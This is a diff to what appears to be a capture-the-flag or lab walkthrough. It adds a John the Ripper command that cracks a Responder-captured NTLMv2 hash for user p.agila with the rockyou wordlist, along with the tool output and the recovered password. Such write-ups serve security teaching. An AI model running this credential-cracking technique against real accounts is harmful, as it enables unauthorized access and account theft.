@@ -334,5 +334,24 @@ The output of Responder
 
 We got the hash of the user p.agila lets save this in a file and crack this using john
 ```bash
-john p.agila.hash
+john p.agila.hash --wordlist=/usr/share/wordlists/rockyou.txt 
 ```
+
+Output:
+```bash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+prometheusx-303  (p.agila)     
+1g 0:00:00:01 DONE (2025-06-30 21:54) 0.9433g/s 4266Kp/s 4266Kc/s 4266KC/s prrm30w..prison only
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+And we got the password for the user p.agila
+```Copy
+prometheusx-303
+```
+
